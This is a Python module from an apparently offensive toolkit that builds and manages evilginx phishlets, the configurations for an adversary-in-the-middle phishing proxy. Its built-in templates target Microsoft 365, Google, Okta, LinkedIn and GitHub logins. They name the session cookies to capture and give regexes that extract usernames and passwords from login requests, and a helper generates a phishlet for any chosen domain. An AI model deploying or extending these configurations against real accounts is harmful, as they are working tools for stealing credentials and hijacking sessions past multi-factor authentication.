"""
Phishlet Manager - Manage evilginx phishlet configurations.

Phishlets are YAML files that tell evilginx how to proxy a specific target:
- Which domains to intercept
- Which cookies to capture
- How to rewrite URLs
- What credentials to extract

Built-in phishlets support major targets: Microsoft 365, Google, Okta, etc.
"""

from __future__ import annotations

import logging
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, ClassVar

import yaml

logger = logging.getLogger(__name__)


@dataclass
class Phishlet:
    """
    A phishlet configuration for evilginx.
    
    Defines how to proxy and capture credentials from a specific target.
    """
    name: str
    author: str = "MoMo"
    version: str = "1.0"
    
    # Target domains
    proxy_hosts: list[dict[str, str]] = field(default_factory=list)
    
    # Subdomains to phish
    sub_filters: list[dict[str, Any]] = field(default_factory=list)
    
    # Auth tokens/cookies to capture
    auth_tokens: list[dict[str, str]] = field(default_factory=list)
    
    # Credential fields
    credentials: dict[str, str] = field(default_factory=dict)
    
    # Force SSL
    force_post: bool = True
    
    # Custom JS injection
    js_inject: str = ""
    
    # Login URL pattern
    login_url: str = ""
    
    # Description
    description: str = ""
    
    # Enabled status
    enabled: bool = False
    hostname: str = ""
    
    def to_yaml(self) -> str:
        """Convert phishlet to YAML format for evilginx."""
        data = {
            "name": self.name,
            "author": self.author,
            "min_ver": "3.0.0",
            "proxy_hosts": self.proxy_hosts,
            "sub_filters": self.sub_filters,
            "auth_tokens": self.auth_tokens,
            "credentials": self.credentials,
            "force_post": self.force_post,
            "login": {"domain": self.login_url} if self.login_url else {},
        }
        
        if self.js_inject:
            data["js_inject"] = self.js_inject
        
        return yaml.dump(data, default_flow_style=False)
    
    @classmethod
    def from_yaml(cls, path: Path) -> Phishlet | None:
        """Load phishlet from YAML file."""
        try:
            data = yaml.safe_load(path.read_text())
            return cls(
                name=data.get("name", path.stem),
                author=data.get("author", "unknown"),
                version=data.get("min_ver", "1.0"),
                proxy_hosts=data.get("proxy_hosts", []),
                sub_filters=data.get("sub_filters", []),
                auth_tokens=data.get("auth_tokens", []),
                credentials=data.get("credentials", {}),
                force_post=data.get("force_post", True),
                js_inject=data.get("js_inject", ""),
                login_url=data.get("login", {}).get("domain", ""),
                description=data.get("description", ""),
            )
        except Exception as e:
            logger.error("Failed to load phishlet %s: %s", path, e)
            return None


class PhishletManager:
    """
    Manages phishlet configurations.
    
    Provides built-in phishlets for common targets and allows
    loading custom phishlets from YAML files.
    """
    
    # Built-in phishlet templates
    BUILTIN_PHISHLETS: ClassVar[dict[str, dict[str, Any]]] = {
        "microsoft365": {
            "name": "microsoft365",
            "author": "MoMo",
            "description": "Microsoft 365 / Office 365 login",
            "proxy_hosts": [
                {"phish_sub": "login", "orig_sub": "login", "domain": "microsoftonline.com", "session": True, "is_landing": True},
                {"phish_sub": "www", "orig_sub": "www", "domain": "office.com", "session": True},
                {"phish_sub": "aadcdn", "orig_sub": "aadcdn", "domain": "msftauth.net", "session": False},
            ],
            "sub_filters": [
                {"triggers_on": "login.microsoftonline.com", "orig_sub": "login", "domain": "microsoftonline.com", "search": "href=\"https://{hostname}", "replace": "href=\"https://{hostname}", "mimes": ["text/html"]},
            ],
            "auth_tokens": [
                {"domain": ".login.microsoftonline.com", "keys": ["ESTSAUTH", "ESTSAUTHPERSISTENT", "SignInStateCookie"]},
            ],
            "credentials": {
                "username": {"key": "login", "search": "\"login\":\"([^\"]+)\"", "type": "post"},
                "password": {"key": "passwd", "search": "\"passwd\":\"([^\"]+)\"", "type": "post"},
            },
            "login_url": "login.microsoftonline.com",
        },
        "google": {
            "name": "google",
            "author": "MoMo",
            "description": "Google Account login",
            "proxy_hosts": [
                {"phish_sub": "accounts", "orig_sub": "accounts", "domain": "google.com", "session": True, "is_landing": True},
                {"phish_sub": "ssl", "orig_sub": "ssl", "domain": "gstatic.com", "session": False},
            ],
            "sub_filters": [],
            "auth_tokens": [
                {"domain": ".google.com", "keys": ["SID", "SSID", "HSID", "APISID", "SAPISID"]},
            ],
            "credentials": {
                "username": {"key": "Email", "search": "\"Email\":\"([^\"]+)\"", "type": "post"},
                "password": {"key": "Passwd", "search": "\"Passwd\":\"([^\"]+)\"", "type": "post"},
            },
            "login_url": "accounts.google.com",
        },
        "okta": {
            "name": "okta",
            "author": "MoMo",
            "description": "Okta SSO login (requires target org)",
            "proxy_hosts": [
                {"phish_sub": "login", "orig_sub": "", "domain": "okta.com", "session": True, "is_landing": True},
            ],
            "sub_filters": [],
            "auth_tokens": [
                {"domain": ".okta.com", "keys": ["sid", "idx"]},
            ],
            "credentials": {
                "username": {"key": "username", "search": "\"username\":\"([^\"]+)\"", "type": "post"},
                "password": {"key": "password", "search": "\"password\":\"([^\"]+)\"", "type": "post"},
            },
            "login_url": "login.okta.com",
        },
        "linkedin": {
            "name": "linkedin",
            "author": "MoMo",
            "description": "LinkedIn login",
            "proxy_hosts": [
                {"phish_sub": "www", "orig_sub": "www", "domain": "linkedin.com", "session": True, "is_landing": True},
            ],
            "sub_filters": [],
            "auth_tokens": [
                {"domain": ".linkedin.com", "keys": ["li_at", "JSESSIONID"]},
            ],
            "credentials": {
                "username": {"key": "session_key", "search": "", "type": "post"},
                "password": {"key": "session_password", "search": "", "type": "post"},
            },
            "login_url": "www.linkedin.com",
        },
        "github": {
            "name": "github",
            "author": "MoMo",
            "description": "GitHub login",
            "proxy_hosts": [
                {"phish_sub": "github", "orig_sub": "", "domain": "github.com", "session": True, "is_landing": True},
            ],
            "sub_filters": [],
            "auth_tokens": [
                {"domain": "github.com", "keys": ["user_session", "_gh_sess", "logged_in"]},
            ],
            "credentials": {
                "username": {"key": "login", "search": "", "type": "post"},
                "password": {"key": "password", "search": "", "type": "post"},
            },
            "login_url": "github.com",
        },
    }
    
    def __init__(self, phishlets_dir: Path | None = None):
        self.phishlets_dir = phishlets_dir or Path("/opt/momo/phishlets")
        self._phishlets: dict[str, Phishlet] = {}
        self._load_builtins()
    
    def _load_builtins(self) -> None:
        """Load built-in phishlet templates."""
        for name, data in self.BUILTIN_PHISHLETS.items():
            phishlet = Phishlet(
                name=data["name"],
                author=data.get("author", "MoMo"),
                description=data.get("description", ""),
                proxy_hosts=data.get("proxy_hosts", []),
                sub_filters=data.get("sub_filters", []),
                auth_tokens=data.get("auth_tokens", []),
                credentials=data.get("credentials", {}),
                login_url=data.get("login_url", ""),
            )
            self._phishlets[name] = phishlet
    
    def load_from_directory(self) -> int:
        """Load custom phishlets from directory."""
        if not self.phishlets_dir.exists():
            logger.warning("Phishlets directory not found: %s", self.phishlets_dir)
            return 0
        
        count = 0
        for yaml_file in self.phishlets_dir.glob("*.yaml"):
            phishlet = Phishlet.from_yaml(yaml_file)
            if phishlet:
                self._phishlets[phishlet.name] = phishlet
                count += 1
                logger.debug("Loaded phishlet: %s", phishlet.name)
        
        logger.info("Loaded %d custom phishlets", count)
        return count
    
    def get_phishlet(self, name: str) -> Phishlet | None:
        """Get a phishlet by name."""
        return self._phishlets.get(name)
    
    def list_phishlets(self) -> list[Phishlet]:
        """List all available phishlets."""
        return list(self._phishlets.values())
    
    def list_phishlet_names(self) -> list[str]:
        """List phishlet names."""
        return list(self._phishlets.keys())
    
    def save_phishlet(self, phishlet: Phishlet) -> Path:
        """Save a phishlet to YAML file."""
        self.phishlets_dir.mkdir(parents=True, exist_ok=True)
        
        path = self.phishlets_dir / f"{phishlet.name}.yaml"
        path.write_text(phishlet.to_yaml())
        
        self._phishlets[phishlet.name] = phishlet
        logger.info("Saved phishlet: %s", path)
        
        return path
    
    def create_custom_phishlet(
        self,
        name: str,
        target_domain: str,
        login_subdomain: str = "login",
        auth_cookies: list[str] | None = None,
    ) -> Phishlet:
        """
        Create a custom phishlet for a new target.
        
        Args:
            name: Phishlet name
            target_domain: Target domain (e.g., "company.com")
            login_subdomain: Login subdomain (e.g., "login", "auth", "sso")
            auth_cookies: List of session cookie names to capture
        
        Returns:
            New Phishlet object
        """
        auth_cookies = auth_cookies or ["session", "token", "sid"]
        
        phishlet = Phishlet(
            name=name,
            description=f"Custom phishlet for {target_domain}",
            proxy_hosts=[
                {
                    "phish_sub": login_subdomain,
                    "orig_sub": login_subdomain,
                    "domain": target_domain,
                    "session": True,
                    "is_landing": True,
                },
            ],
            auth_tokens=[
                {"domain": f".{target_domain}", "keys": auth_cookies},
            ],
            credentials={
                "username": {"key": "username", "search": "", "type": "post"},
                "password": {"key": "password", "search": "", "type": "post"},
            },
            login_url=f"{login_subdomain}.{target_domain}",
        )
        
        return phishlet
    
    def get_stats(self) -> dict[str, Any]:
        """Get phishlet statistics."""
        enabled = [p for p in self._phishlets.values() if p.enabled]
        return {
            "total_phishlets": len(self._phishlets),
            "enabled_phishlets": len(enabled),
            "builtin_count": len(self.BUILTIN_PHISHLETS),
            "custom_count": len(self._phishlets) - len(self.BUILTIN_PHISHLETS),
        }

